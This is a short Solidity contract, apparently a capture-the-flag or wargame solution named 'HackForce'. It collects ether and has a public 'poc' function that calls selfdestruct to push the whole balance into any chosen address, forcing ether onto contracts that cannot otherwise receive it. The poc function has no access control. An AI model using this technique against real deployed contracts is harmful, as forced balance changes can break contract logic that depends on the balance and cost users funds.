// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

contract HackForce{
    uint b;
    event log(uint b);
    constructor()payable{
        b=0;    }
    
    receive() external payable {
        b+=msg.value;
        emit log(b);
     }
    function poc(address payable addr) public {
        selfdestruct(addr);
    }

}
